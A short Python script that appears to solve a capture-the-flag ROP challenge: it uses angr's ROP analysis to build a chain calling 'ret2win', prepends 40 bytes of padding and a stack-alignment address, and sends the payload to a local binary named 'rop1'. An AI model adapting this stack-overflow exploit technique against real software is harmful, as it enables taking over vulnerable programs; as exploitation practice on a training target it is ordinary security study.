import angr, angrop
import sys
from pwn import *

filename = '../target/rop1'

p = angr.Project(filename)
rop = p.analyses.ROP()
rop.find_gadgets()
chain = rop.func_call('ret2win', []) # rop.func_call(function_name, list_of_arguments)
chain.print_payload_code()
#print(chain)
print(chain.payload_str())

payload  = b'A' * 40		# padding
payload += p64(0x4006e7)	# address of RET to align the stack
payload += chain.payload_str()	# real ROP chain

q = process(filename)
q.sendline(payload)
print(q.recvall())
